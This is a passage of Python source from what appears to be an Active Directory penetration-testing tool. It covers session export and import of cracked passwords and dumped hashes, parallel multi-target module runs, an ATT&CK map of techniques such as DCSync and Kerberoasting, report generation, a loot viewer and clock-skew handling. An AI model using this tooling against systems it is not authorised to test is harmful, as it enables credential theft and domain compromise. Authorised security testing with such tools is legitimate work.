        log(f'Serving at {C0}{url}{RESET} — press Ctrl+C to stop','info')
        subprocess.Popen(['xdg-open', url], stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
        try:
            while True: import time; time.sleep(1)
        except KeyboardInterrupt:
            server.shutdown()
            log('Server stopped','info')
    except OSError:
        log(f'Port {port} in use — open manually: {C0}{out_path}{RESET}','warn')
        subprocess.Popen(['xdg-open', out_path], stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)


def _export_session(target):
    """Export current session state to a shareable JSON file."""
    import json as _json
    out_path = os.path.join(target.loot_dir, 'session_export.json')
    ws = os.path.basename(os.path.dirname(target.loot_dir))
    data = {
        'version': f'segfault-ad-v{VERSION}',
        'exported':   datetime.now().isoformat(),
        'workspace':  ws,
        'target': {
            'domain':   target.domain,
            'dc':       target.dc,
            'fqdn':     target.fqdn,
            'user':     target.user,
            'password': target.password,
            'hash':     target.hash,
        },
        'results':    _SESSION_RESULTS,
        'cracked':    [],
        'hashes':     [],
    }
    # include cracked creds
    cracked_f = os.path.join(target.loot_dir,'cracked.txt')
    if os.path.exists(cracked_f):
        data['cracked'] = open(cracked_f).read().splitlines()
    # include hashes
    for hf in ['dcsync.txt.ntds','asreproast_hashes.txt','kerberoast_hashes.txt']:
        fp = os.path.join(target.loot_dir,hf)
        if os.path.exists(fp):
            data['hashes'] += open(fp).read().splitlines()
    # write
    with open(out_path,'w') as f:
        _json.dump(data, f, indent=2, default=str)
    log(f'{GREEN}Session exported → {WHITE}{out_path}{RESET}','success')
    log(f'{GREY}Share with teammate: scp {out_path} teammate@host:{RESET}','info')
    hr()


def _import_session(target, path):
    """Import a session from an exported JSON file."""
    import json as _json
    if not os.path.exists(path):
        log(f'File not found: {path}','error'); return
    try:
        data = _json.loads(open(path).read())
    except Exception as e:
        log(f'Invalid session file: {e}','error'); return

    t = data.get('target',{})
    log(f'{C0}Importing session from {WHITE}{path}{RESET}','info')
    log(f'  workspace:  {WHITE}{data.get("workspace","?")}{RESET}','info')
    log(f'  domain:     {WHITE}{t.get("domain","?")}{RESET}','info')
    log(f'  user:       {WHITE}{t.get("user","?")}{RESET}','info')
    log(f'  exported:   {WHITE}{data.get("exported","?")}{RESET}','info')

    ans = input_field('Import target settings + creds','y')
    if ans.lower() == 'y':
        if t.get('domain'):   target.domain   = t['domain']
        if t.get('dc'):       target.dc       = t['dc']
        if t.get('fqdn'):     target.fqdn     = t['fqdn']
        if t.get('user'):     target.user     = t['user']
        if t.get('password'): target.password = t['password']
        if t.get('hash'):     target.hash     = t['hash']

    ans2 = input_field('Import session results (attack chain)','y')
    if ans2.lower() == 'y':
        global _SESSION_RESULTS
        _SESSION_RESULTS = data.get('results', [])
        log(f'{GREEN}{len(_SESSION_RESULTS)} result(s) imported into attack map{RESET}','success')

    ans3 = input_field('Import cracked creds to loot dir','y')
    if ans3.lower() == 'y':
        cracked = data.get('cracked',[])
        if cracked:
            cracked_f = os.path.join(target.loot_dir,'cracked.txt')
            with open(cracked_f,'a') as f: f.write('\n'.join(cracked)+'\n')
            log(f'{GREEN}{len(cracked)} cracked cred(s) saved{RESET}','success')

    log(f'{GREEN}Session imported ✓{RESET}','success')
    hr()


def _multi_target(target, args):
    """Run a module against multiple targets in parallel."""
    hr()
    log(f'{C0}Multi-target mode{RESET}','info')
    log(f'{GREY}Run any module against a list of IPs/hosts in parallel{RESET}','info')

    if args:
        target_file = args[0]
    else:
        target_file = input_field('target file (one IP per line)','')
    if not target_file or not os.path.exists(target_file):
        log('File not found','error'); hr(); return

    targets = [l.strip() for l in open(target_file).read().splitlines()
               if l.strip() and not l.startswith('#')]
    if not targets:
        log('No targets in file','error'); hr(); return

    module_name = input_field(f'module to run against {len(targets)} targets','nmap')
    if module_name not in MODULES:
        log(f'Unknown module: {module_name}','error'); hr(); return

    log(f'Running {C0}{module_name}{RESET} against {WHITE}{len(targets)}{RESET} targets...','info')
    hr()

    import copy as _copy, threading as _mth
    results = {}
    lock = threading.Lock()

    def _run_one(ip):
        fake = _copy.copy(target)
        fake.dc = ip
        try:
            mod = MODULES[module_name]()
            mod.run(fake)
            with lock: results[ip] = 'done'
        except Exception as e:
            with lock: results[ip] = f'error: {e}'

    threads = [threading.Thread(target=_run_one, args=(ip,), daemon=True) for ip in targets]
    for t in threads: t.start()
    for t in threads: t.join()

    log(f'{GREEN}Multi-target complete — {len(results)} host(s) processed{RESET}','success')
    hr()



# MITRE ATT&CK mapping for modules
_MITRE_MAP = {
    'nmap':         ('T1046',  'Network Service Discovery'),
    'enum':         ('T1087',  'Account Discovery'),
    'ldapenum':     ('T1069',  'Permission Groups Discovery'),
    'asreproast':   ('T1558.004', 'AS-REP Roasting'),
    'kerberoast':   ('T1558.003', 'Kerberoasting'),
    'spray':        ('T1110.003', 'Password Spraying'),
    'hashcrack':    ('T1110.002', 'Password Cracking'),
    'shares':       ('T1135',  'Network Share Discovery'),
    'dcsync':       ('T1003.006', 'DCSync'),
    'secretsdump':  ('T1003',  'OS Credential Dumping'),
    'relay':        ('T1557',  'LLMNR/NBT-NS Poisoning'),
    'certipy':      ('T1649',  'Steal or Forge Auth Certificates'),
    'bloodhound':   ('T1069',  'Domain Trust Discovery'),
    'adrecon':      ('T1087.002', 'Domain Account Discovery'),
    'exec':         ('T1021.006', 'Remote Services: WinRM'),
    'pth':          ('T1550.002', 'Pass the Hash'),
    'ptt':          ('T1550.003', 'Pass the Ticket'),
    'gpp':          ('T1552.006', 'Group Policy Preferences'),
    'backupabuse':  ('T1003.002', 'SAM Dump'),
    'bloody':       ('T1222',  'File and Directory Permissions Modification'),
    'zerologon':    ('T1190',  'Exploit Public-Facing Application'),
    'nopac':        ('T1558',  'Steal or Forge Kerberos Tickets'),
    'pathpwn':      ('T1484',  'Domain Policy Modification'),
    'snaffler':     ('T1083',  'File and Directory Discovery'),
    'lsassy':       ('T1003.001', 'LSASS Memory'),
    'sccm':         ('T1078',  'Valid Accounts'),
    'trusts':       ('T1482',  'Domain Trust Discovery'),
}

def _gen_report(target):
    """Generate a full HTML pentest report for the current session."""
    import datetime, html as _html
    hr()
    if not target.domain:
        log('No target set — nothing to report','warn'); hr(); return

    ts        = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    domain    = target.domain or 'UNKNOWN'
    dc        = target.dc or ''
    loot_dir  = target.loot_dir or ''
    out_path  = os.path.join(loot_dir, f'report_{domain}_{ts}.html')
    os.makedirs(loot_dir, exist_ok=True)

    log(f'Generating report for {WHITE}{domain}{RESET}...','info')

    # ── gather data ──────────────────────────────────────────────────────────
    creds = []
    cracked_path = os.path.join(loot_dir, 'cracked.txt')
    if os.path.exists(cracked_path):
        for line in open(cracked_path, errors='replace').read().splitlines():
            line = line.strip()
            if ':' in line and not line.startswith('#'):
                u, p = line.split(':', 1)
                creds.append({'user': u.strip(), 'secret': p.strip(), 'type': 'password'})

    hashes = []
    for fname in (os.listdir(loot_dir) if os.path.exists(loot_dir) else []):
        if fname.endswith('.ntds') or fname in ('hashes.txt',):
            for line in open(os.path.join(loot_dir,fname), errors='replace').read().splitlines():
                if ':::' in line:
                    parts = line.split(':')
                    if len(parts) >= 4:
                        hashes.append({'user': parts[0], 'hash': parts[3]})

    flags = {}
    for fname in ('user.txt','root.txt'):
        fpath = os.path.join(loot_dir, fname)
        if os.path.exists(fpath):
            flags[fname.replace('.txt','')] = open(fpath, errors='replace').read().strip()

    loot_files = []
    if os.path.exists(loot_dir):
        for fname in sorted(os.listdir(loot_dir)):
            fpath = os.path.join(loot_dir, fname)
            if os.path.isfile(fpath) and not fname.endswith('.html'):
                sz = os.path.getsize(fpath)
                mt = datetime.datetime.fromtimestamp(os.path.getmtime(fpath)).strftime('%H:%M:%S')
                loot_files.append({'name': fname, 'size': sz, 'time': mt})

    chain = list(_SESSION_RESULTS)

    # build MITRE ATT&CK coverage
    mitre_hits = []
    for r in chain:
        mod = r.get('module','')
        if mod in _MITRE_MAP:
            tid, tname = _MITRE_MAP[mod]
            mitre_hits.append({'id':tid,'name':tname,'module':mod,'detail':r.get('detail','')})

    # cleanup actions
    cleanup_items = [{'type':e['type'],'desc':e['desc'],'auto':callable(e.get('undo'))}
                     for e in _CLEANUP_STACK]

    # severity assessment
    severity = 'CRITICAL' if any('administrator' in str(r).lower() or 'dcsync' in str(r).lower()
                                  for r in chain) else \
               'HIGH' if hashes or creds else \
               'MEDIUM' if chain else 'LOW'
    sev_color = {'CRITICAL':'#f85149','HIGH':'#d29922','MEDIUM':'#388bfd','LOW':'#3fb950'}.get(severity,'#888')

    # ── build HTML ───────────────────────────────────────────────────────────
    def e(s): return _html.escape(str(s))
    now_str = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Pentest Report — {e(domain)}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Segoe UI',system-ui,sans-serif;font-size:13px;background:#0d1117;color:#c9d1d9;line-height:1.6}}
.page{{max-width:1100px;margin:0 auto;padding:32px 24px}}
h1{{font-size:24px;color:#e6edf3;margin-bottom:4px}}
h2{{font-size:14px;font-weight:600;color:#e6edf3;margin:24px 0 10px;padding-bottom:6px;border-bottom:1px solid #21262d;text-transform:uppercase;letter-spacing:.08em}}
h3{{font-size:12px;font-weight:600;color:#8b949e;margin-bottom:8px}}
.topbar{{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:32px;padding-bottom:24px;border-bottom:1px solid #21262d}}
.brand{{font-size:11px;color:#8b949e;margin-top:4px}}
.sev{{font-size:11px;font-weight:700;padding:4px 14px;border-radius:99px;border:1px solid;margin-top:8px;display:inline-block}}
.meta-grid{{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}}
.meta-card{{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:12px 14px}}
.meta-label{{font-size:10px;color:#8b949e;text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px}}
.meta-val{{font-size:18px;font-weight:600;color:#e6edf3}}
.meta-val.red{{color:#f85149}}.meta-val.amber{{color:#d29922}}.meta-val.green{{color:#3fb950}}
.exec-summary{{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:16px;margin-bottom:24px;font-size:13px;color:#c9d1d9;line-height:1.7}}
.chain{{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:8px}}
.chain-node{{background:#0d1117;border:1px solid #21262d;border-radius:6px;padding:6px 10px;font-size:11px}}
.chain-node b{{color:#e6edf3;display:block}}
.chain-node small{{color:#8b949e}}
.chain-arrow{{color:#484f58;font-size:16px;align-self:center}}
table{{width:100%;border-collapse:collapse;margin-bottom:8px;font-size:12px}}
th{{text-align:left;padding:6px 10px;background:#161b22;color:#8b949e;font-weight:500;font-size:10px;text-transform:uppercase;letter-spacing:.06em;border-bottom:1px solid #21262d}}
td{{padding:6px 10px;border-bottom:1px solid #21262d;color:#c9d1d9}}
tr:hover td{{background:#161b22}}
.mono{{font-family:monospace;font-size:11px;color:#79c0ff}}
.flag-box{{display:flex;gap:12px;margin-bottom:16px}}
.flag{{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:12px 16px;flex:1}}
.flag.user{{border-color:rgba(56,139,253,.4)}}
.flag.root{{border-color:rgba(248,81,73,.4)}}
.flag-label{{font-size:10px;color:#8b949e;margin-bottom:4px}}
.flag-val{{font-family:monospace;font-size:13px;color:#79c0ff;word-break:break-all}}
.mitre-grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}}
.mitre-card{{background:#161b22;border:1px solid #21262d;border-radius:6px;padding:8px 10px}}
.mitre-id{{font-size:10px;font-weight:600;color:#d29922;margin-bottom:2px}}
.mitre-name{{font-size:11px;color:#c9d1d9}}
.mitre-mod{{font-size:10px;color:#8b949e}}
.cleanup-item{{display:flex;gap:8px;padding:5px 0;border-bottom:1px solid #21262d;font-size:11px}}
.cleanup-type{{font-size:10px;padding:1px 6px;border-radius:4px;background:#21262d;color:#8b949e;white-space:nowrap;align-self:center}}
.auto-yes{{color:#3fb950}}.auto-no{{color:#d29922}}
.section{{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:16px;margin-bottom:16px}}
.dim{{color:#8b949e}}
.footer{{text-align:center;font-size:10px;color:#484f58;margin-top:32px;padding-top:16px;border-top:1px solid #21262d}}
</style>
</head>
<body>
<div class="page">

<div class="topbar">
  <div>
    <h1>Active Directory Pentest Report</h1>
    <div class="brand">segfault.solutions · segfault-ad v{{VERSION}} · {e(now_str)}</div>
    <div class="sev" style="color:{sev_color};border-color:{sev_color}40">{e(severity)}</div>
  </div>
  <div style="text-align:right">
    <div style="font-size:18px;font-weight:600;color:#e6edf3">{e(domain)}</div>
    <div class="dim" style="font-size:12px">{e(dc)}</div>
    <div class="dim" style="font-size:11px">user: {e(target.user or "—")}</div>
  </div>
</div>

<div class="meta-grid">
  <div class="meta-card"><div class="meta-label">attack steps</div><div class="meta-val">{len(chain)}</div></div>
  <div class="meta-card"><div class="meta-label">creds cracked</div><div class="meta-val {'red' if creds else ''}">{len(creds)}</div></div>
  <div class="meta-card"><div class="meta-label">hashes dumped</div><div class="meta-val {'red' if hashes else ''}">{len(hashes)}</div></div>
  <div class="meta-card"><div class="meta-label">flags captured</div><div class="meta-val {'green' if flags else ''}">{len(flags)}</div></div>
</div>

<div class="exec-summary">
  <strong style="color:#e6edf3">Executive Summary.</strong>&nbsp;
  Assessment of <strong>{e(domain)}</strong> revealed a <strong style="color:{sev_color}">{e(severity)}</strong> risk posture.
  {f'The domain controller at <strong>{e(dc)}</strong> was successfully compromised' if hashes else f'Partial access was obtained to <strong>{e(dc)}</strong>'}.
  {f'A total of <strong>{len(hashes)}</strong> NT hashes were extracted via DCSync.' if hashes else ''}
  {f'<strong>{len(creds)}</strong> plaintext credential(s) were recovered.' if creds else ''}
  {f'<strong>{len(flags)}</strong> flag(s) captured.' if flags else ''}
  {f'<strong>{len(mitre_hits)}</strong> MITRE ATT&CK technique(s) exercised.' if mitre_hits else ''}
  The attack chain consisted of <strong>{len(chain)}</strong> steps.
  {'Full domain compromise achieved — all domain credentials at risk.' if severity == 'CRITICAL' else ''}
</div>

'''

    # flags
    if flags:
        html += '<h2>Flags</h2><div class="flag-box">'
        if 'user' in flags:
            html += f'<div class="flag user"><div class="flag-label">🏴 user.txt</div><div class="flag-val">{e(flags["user"])}</div></div>'
        if 'root' in flags:
            html += f'<div class="flag root"><div class="flag-label">🏴 root.txt</div><div class="flag-val">{e(flags["root"])}</div></div>'
        html += '</div>'

    # attack chain
    if chain:
        html += '<h2>Attack Chain</h2><div class="section"><div class="chain">'
        for i, r in enumerate(chain):
            mod = e(r.get('module','?'))
            det = e(r.get('detail',''))
            tid, tname = _MITRE_MAP.get(r.get('module',''), ('',''))
            mitre_str = f'<small style="color:#d29922">{e(tid)}</small><br>' if tid else ''
            html += f'<div class="chain-node"><b>{mod}</b>{mitre_str}<small>{det}</small></div>'
            if i < len(chain)-1: html += '<span class="chain-arrow">→</span>'
        html += '</div></div>'

    # MITRE ATT&CK
    if mitre_hits:
        html += '<h2>MITRE ATT&CK Coverage</h2><div class="mitre-grid">'
        seen = set()
        for m in mitre_hits:
            if m['id'] not in seen:
                seen.add(m['id'])
                html += f'''<div class="mitre-card">
                  <div class="mitre-id">{e(m["id"])}</div>
                  <div class="mitre-name">{e(m["name"])}</div>
                  <div class="mitre-mod">{e(m["module"])}</div>
                </div>'''
        html += '</div><br>'

    # credentials
    if creds:
        html += '<h2>Credentials</h2><div class="section"><table><tr><th>Username</th><th>Password</th></tr>'
        for c in creds:
            html += f'<tr><td>{e(c["user"])}</td><td class="mono">{e(c["secret"])}</td></tr>'
        html += '</table></div>'

    # hashes
    if hashes:
        html += f'<h2>NT Hashes ({len(hashes)} total)</h2><div class="section"><table><tr><th>Username</th><th>NT Hash</th></tr>'
        for h in hashes[:50]:
            html += f'<tr><td>{e(h["user"])}</td><td class="mono">{e(h["hash"])}</td></tr>'
        if len(hashes) > 50:
            html += f'<tr><td colspan="2" class="dim">... and {len(hashes)-50} more</td></tr>'
        html += '</table></div>'

    # cleanup / remediation
    if cleanup_items:
        html += '<h2>Remediation — Changes Made</h2><div class="section">'
        for item in cleanup_items:
            auto = item['auto']
            html += f'''<div class="cleanup-item">
              <span class="cleanup-type">{e(item["type"])}</span>
              <span style="flex:1">{e(item["desc"])}</span>
              <span class="{'auto-yes' if auto else 'auto-no'}">{("✓ auto-reverted" if auto else "⚠ manual review")}</span>
            </div>'''
        html += '</div>'

    # loot files
    if loot_files:
        html += '<h2>Loot Files</h2><div class="section"><table><tr><th>File</th><th>Size</th><th>Time</th></tr>'
        for f in loot_files:
            sz = f'{f["size"]:,} B' if f["size"] < 1024 else f'{f["size"]//1024} KB'
            html += f'<tr><td class="mono">{e(f["name"])}</td><td class="dim">{sz}</td><td class="dim">{e(f["time"])}</td></tr>'
        html += '</table></div>'

    html += f'<div class="footer">generated by segfault-ad v{VERSION} · {e(now_str)} · segfault.solutions</div>'
    html += '</div></body></html>'

    with open(out_path,'w') as f: f.write(html)
    log(f'{GREEN}Report generated → {WHITE}{out_path}{RESET}','success')
    log(f'Opening in browser...','info')
    subprocess.Popen(['xdg-open', out_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    hr()

def show_loot(target):
    hr()
    if not os.path.isdir(target.loot_dir):
        print(f'  {GREY}no loot yet — run some modules first{RESET}'); hr(); return

    # collect all files with metadata
    files = []
    for root, _, fnames in os.walk(target.loot_dir):
        for f in sorted(fnames):
            fp = os.path.join(root, f)
            try:
                st = os.stat(fp)
                files.append((fp, st.st_size, st.st_mtime))
            except Exception:
                pass
    if not files:
        print(f'  {GREY}loot directory empty{RESET}'); hr(); return

    files.sort(key=lambda x: x[2], reverse=True)

    # "new" = modified in last 30 minutes
    import time as _time
    now = _time.time()
    NEW_THRESHOLD = 30 * 60

    # file type coloring + icons
    def _file_style(fp, size):
        ext  = os.path.splitext(fp)[1].lower()
        name = os.path.basename(fp).lower()
        if ext in ('.ntds','.sam','.secrets') or 'dcsync' in name:
            return RED, '🔑'
        if ext == '.ccache' or 'ccache' in name:
            return PINK, '🎫'
        if ext == '.pfx' or ext == '.pem':
            return PURPLE, '📜'
        if 'hash' in name or ext == '.hash':
            return ORANGE, '🔒'
        if 'cracked' in name or 'password' in name:
            return GREEN, '✓ '
        if ext == '.zip' or 'bloodhound' in name:
            return C0, '🩸'
        if ext in ('.json', '.csv'):
            return C0, '📊'
        if ext in ('.txt', '.md'):
            return WHITE, '📄'
        if ext in ('.env', '.ini'):
            return GREY, '⚙ '
        return WHITE, '  '

    def _size_str(size):
        if size > 1024*1024: return f'{size//1024//1024}MB'
        if size > 1024:      return f'{size//1024}KB'
        return f'{size}B'

    print(f'\n  {C0}{BOLD}loot{RESET}  {GREY}{target.loot_dir}{RESET}\n')
    print(f'  {GREY}{"time":<12} {"file":<40} {"size":>6}  preview{RESET}')
    print(f'  {GREY}{"─"*75}{RESET}')

    shown = set()
    for fp, size, mtime in files:
        name  = os.path.relpath(fp, target.loot_dir)
        ts    = datetime.fromtimestamp(mtime).strftime('%m-%d %H:%M')
        sz    = _size_str(size)
        color, icon = _file_style(fp, size)
        is_new = (now - mtime) < NEW_THRESHOLD
        new_tag = f' {GREEN}◄ new{RESET}' if is_new else ''

        # truncate long names — keep extension visible
        MAX_NAME = 38
        if len(name) > MAX_NAME:
            ext = os.path.splitext(name)[1]
            stem = name[:MAX_NAME - len(ext) - 1]
            display_name = f'{stem}…{ext}'
        else:
            display_name = name

        # inline preview for key files
        preview = ''
        try:
            ext = os.path.splitext(fp)[1].lower()
            bname = os.path.basename(fp).lower()
            if size > 0 and size < 50000 and ext in ('.txt','.ntds','') and any(
                    x in bname for x in ['cracked','hash','dcsync','user','root','flag']):
                lines = open(fp, errors='ignore').read().splitlines()
                if lines:
                    first = lines[0][:60].replace('\n','')
                    preview = f'{GREY}  {first}{"…" if len(lines)>1 else ""}{RESET}'
        except Exception:
            pass

        print(f'  {GREY}{ts}{RESET}  {icon}{color}{display_name:<39}{RESET}  {GREY}{sz:>6}{RESET}{new_tag}')
        if preview:
            print(f'  {" "*13}{preview}')

    # summary stats
    total_size = sum(s for _,s,_ in files)
    new_count  = sum(1 for _,_,m in files if (now-m) < NEW_THRESHOLD)
    print()
    print(f'  {GREY}{len(files)} files  {_size_str(total_size)} total', end='')
    if new_count: print(f'  {GREEN}{new_count} new in last 30min{RESET}', end='')
    print(f'{RESET}')
    print()
    # quick actions
    cracked = os.path.join(target.loot_dir,'cracked.txt')
    if os.path.exists(cracked) and os.path.getsize(cracked) > 0:
        print(f'  {GREEN}cracked passwords:{RESET}')
        for line in open(cracked, errors='ignore').read().splitlines():
            if line.strip(): print(f'    {GREEN}{line.strip()}{RESET}')
        print()
    hr()


def _write_krb5(target):
    """Write /etc/krb5.conf for the current target domain."""
    if not target.domain or not target.dc:
        log('Set domain and DC first', 'error'); return
    realm = target.domain.upper()
    krb5  = f"""[libdefaults]
    default_realm = {realm}
    dns_lookup_realm = false
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    forwardable = true
    rdns = false
    no_addresses = true

[realms]
    {realm} = {{
        kdc = {target.dc}
        admin_server = {target.dc}
    }}

[domain_realm]
    .{target.domain} = {realm}
    {target.domain} = {realm}
"""
    log(f'Writing /etc/krb5.conf for {WHITE}{realm}{RESET}...', 'info')
    try:
        # try direct write first (root or already writable)
        try:
            open('/etc/krb5.conf','w').write(krb5)
            log(f'{GREEN}krb5.conf written → /etc/krb5.conf{RESET}', 'success')
            return
        except PermissionError:
            pass
        # use sudo tee — let it prompt naturally on the terminal
        proc = subprocess.Popen(['sudo', 'tee', '/etc/krb5.conf'],
                                stdin=subprocess.PIPE,
                                stdout=subprocess.DEVNULL,
                                stderr=None)
        proc.communicate(krb5.encode())
        if proc.returncode == 0:
            log(f'{GREEN}krb5.conf written → /etc/krb5.conf{RESET}', 'success')
        else:
            log(f'sudo failed — writing to loot dir instead', 'warn')
            local = os.path.join(target.loot_dir, 'krb5.conf')
            open(local,'w').write(krb5)
            log(f'Apply: {WHITE}sudo cp {local} /etc/krb5.conf{RESET}', 'info')
    except Exception as exc:
        log(f'krb5.conf error: {exc}', 'error')

def detect_skew(target):
    """Query DC time via nmblookup/rpcclient/nmap and compute offset."""
    import re as _re, subprocess as _sp
    hr()
    log('Detecting clock skew from DC...', 'info')

    dc_time = None

    # Try net time
    net = check_tool('net')
    if net and target.dc:
        try:
            out = subprocess.check_output([net, 'time', '-S', target.dc], stderr=subprocess.DEVNULL, text=True, timeout=5)
            m = _re.search(r'\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2}', out)
            if m: dc_time = m.group(0); log(f'DC time via net: {WHITE}{dc_time}{RESET}', 'success')
        except Exception: pass

    # Try rpcclient
    if not dc_time:
        rpc = check_tool('rpcclient')
        if rpc and target.dc and target.user:
            auth = f'{target.user}%{target.password or ""}'
            try:
                out = subprocess.check_output([rpc, '-U', auth, target.dc, '-c', 'gettime'],
                                        stderr=subprocess.DEVNULL, text=True, timeout=5)
                m = _re.search(r'(\w+ \w+ +\d+ \d{2}:\d{2}:\d{2} \d{4})', out)
                if m: dc_time = m.group(1); log(f'DC time via rpcclient: {WHITE}{dc_time}{RESET}', 'success')
            except Exception: pass

    # Try nmap clock-skew script
    if not dc_time:
        nmap = check_tool('nmap')
        if nmap and target.dc:
            try:
                out = subprocess.check_output([nmap, '-sV', '--script', 'clock-skew', '-p', '88,389',
                                        target.dc, '--open'], stderr=subprocess.DEVNULL, text=True, timeout=15)
                m = _re.search(r'clock-skew:\s*mean\s+([\+\-]?[\d\.]+[smh])', out)
                if m: log(f'nmap clock-skew: {WHITE}{m.group(1)}{RESET}', 'success')
            except Exception: pass

    if not dc_time:
        log('Could not get DC time automatically', 'warn')
        log(f'Try manually: {WHITE}sudo ntpdate {target.dc or "DC_IP"}{RESET}', 'info')
        log(f'Or set skew:  {WHITE}faketime "+2h30m" python3 segfault-ad.py{RESET}', 'info')
        hr(); return

    # Compute offset
    import datetime as _dt
    fmts = ['%Y-%m-%d %H:%M:%S', '%a %b %d %H:%M:%S %Y', '%a %b  %d %H:%M:%S %Y']
    dc_dt = None
    for fmt in fmts:
        try: dc_dt = _dt.datetime.strptime(dc_time.strip(), fmt); break
        except ValueError: continue

    if dc_dt:
        local_dt  = _dt.datetime.utcnow()
        delta     = dc_dt - local_dt
        total_sec = int(delta.total_seconds())
        sign      = '+' if total_sec >= 0 else '-'
        abs_sec   = abs(total_sec)
        h, rem    = divmod(abs_sec, 3600)
        m2, s     = divmod(rem, 60)

        if abs_sec < 30:
            log(f'Clock in sync — skew {WHITE}{total_sec}s{RESET}, no faketime needed', 'success')
            target.skew = None
        else:
            skew_str = f'{sign}{h}h{m2}m{s}s' if h else (f'{sign}{m2}m{s}s' if m2 else f'{sign}{s}s')
            log(f'Skew detected: {ORANGE}{skew_str}{RESET} ({total_sec}s)', 'warn')
            target.skew = skew_str

            faketime = check_tool('faketime')
            if faketime:
                log(f'faketime available — Kerberos modules will auto-wrap', 'success')
                log(f'All commands will run as: {WHITE}faketime "{skew_str}" <cmd>{RESET}', 'info')
            else:
                log('faketime not found — install: {WHITE}sudo apt install faketime{RESET}', 'warn')
                log(f'Or sync manually: {WHITE}sudo ntpdate {target.dc}{RESET}  {GREY}(or ntpsec-ntpdate on Kali 2024+){RESET}', 'info')
                log(f'Or force sync:    {WHITE}sudo timedatectl set-ntp false && sudo date -s "{dc_time}"{RESET}', 'info')
    hr()

def do_clockskew(target):
    """clockskew command — detect or manually set skew."""
    hr()
    action = input_field('action', 'detect', ['detect', 'set', 'clear', 'sync'])
    if action == 'detect':
        if not target.dc:
            log('Set DC first', 'error'); hr(); return
        detect_skew(target)
    elif action == 'set':
        skew = input_field('skew offset (e.g. +2h30m, -45m)', target.skew or '')
        if skew: target.skew = skew; log(f'Skew set: {ORANGE}{skew}{RESET}', 'success')
    elif action == 'clear':
        target.skew = None; log('Skew cleared', 'success')
    elif action == 'sync':
        if not target.dc: log('Set DC first', 'error'); hr(); return
        log('Disabling NTP to prevent clock reset...', 'info')
        os.system('sudo -n timedatectl set-ntp false 2>/dev/null || true')
        log('Syncing clock to DC...', 'info')
        ntpdate = check_tool('ntpdate', 'ntpsec-ntpdate')
        rc = 1
        if ntpdate:
            log(f'{GREY}sudo {ntpdate} {target.dc}{RESET}', 'info')
            rc = _sudo_run(f'sudo {ntpdate} {target.dc}')
        # fallback: get time via rpcclient and set via date
        if rc != 0:
            log('ntpdate failed — trying rpcclient gettime...', 'warn')
            rpc = check_tool('rpcclient')
            if rpc and target.user:
                import re as _re
                auth = f'{target.user}%{target.password or ""}'
                try:
                    out = subprocess.check_output([rpc, '-U', auth, target.dc, '-c', 'gettime'],
                                                  stderr=subprocess.DEVNULL, text=True, timeout=5)
                    m = _re.search(r'(\w{3} \w{3}\s+\d+ \d{2}:\d{2}:\d{2} \d{4})', out)
                    if m:
                        dc_time = m.group(1)
                        log(f'DC time: {WHITE}{dc_time}{RESET}', 'info')
                        rc = subprocess.run(['sudo', 'date', '-s', dc_time],
                                           stdout=subprocess.DEVNULL).returncode
                        if rc == 0: log('Clock set via rpcclient', 'success')
                except Exception as e:
                    log(f'rpcclient failed: {e}', 'warn')
        # fallback: net time
        if rc != 0:
            log('Trying net time...', 'warn')
            try:
                import re as _re
                out = subprocess.check_output(['net', 'time', '-S', target.dc],
                                              stderr=subprocess.DEVNULL, text=True, timeout=5)
                m = _re.search(r'(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})', out)
                if m:
                    rc = subprocess.run(['sudo', 'date', '-s', m.group(1)],
                                       stdout=subprocess.DEVNULL).returncode
            except Exception: pass
        # fallback: LDAP rootDSE currentTime — works when only LDAP/WinRM open
        if rc != 0:
            log('Trying LDAP currentTime (works when only port 389 is open)...', 'warn')
            try:
                import re as _re, socket as _sk
                # raw LDAP anonymous bind + rootDSE query
                def _ldap_time(host):
                    s = _sk.create_connection((host, 389), timeout=5)
                    # anonymous simple bind
                    s.sendall(bytes.fromhex('300c020101600702010304008000'))
                    s.recv(1024)
                    # search rootDSE for currentTime
                    req = bytes.fromhex(
                        '3035020102' # msgid=2
                        '6330'       # search request
                        '0400'       # base=""
                        '0a0100'     # scope=base
                        '0a0100'     # deref=never
                        '020100'     # sizeLimit=0
                        '020100'     # timeLimit=0
                        '010100'     # attrsOnly=false
                        '870b'       # filter present
                    ) + b'\x87\x0bobjectClass' + bytes.fromhex('300e040b63757272656e7454696d65')
                    s.sendall(b'\x30\x27\x02\x01\x02\x63\x22\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0bobjectClass\x30\x0e\x04\x0ccurrentTime')
                    data = b''
                    while True:
                        chunk = s.recv(4096)
                        if not chunk: break
                        data += chunk
                        if len(data) > 100: break
                    s.close()
                    m = _re.search(rb'(\d{14})', data)
                    return m.group(1).decode() if m else None
                raw = _ldap_time(target.dc)
                if raw:
                    # format: YYYYMMDDHHmmss
                    import datetime as _dt
                    dt = _dt.datetime.strptime(raw, '%Y%m%d%H%M%S')
                    dc_time = dt.strftime('%Y-%m-%d %H:%M:%S')
                    log(f'DC time via LDAP: {WHITE}{dc_time}{RESET}', 'info')
                    rc = subprocess.run(['sudo', 'date', '-s', dc_time],
                                       stdout=subprocess.DEVNULL).returncode
            except Exception as e:
                log(f'LDAP time failed: {e}', 'warn')
        if rc == 0:
            target.skew = None
            log('Clock synced — no faketime needed', 'success')
            if target.domain and target.dc:
                _write_krb5(target)
        else:
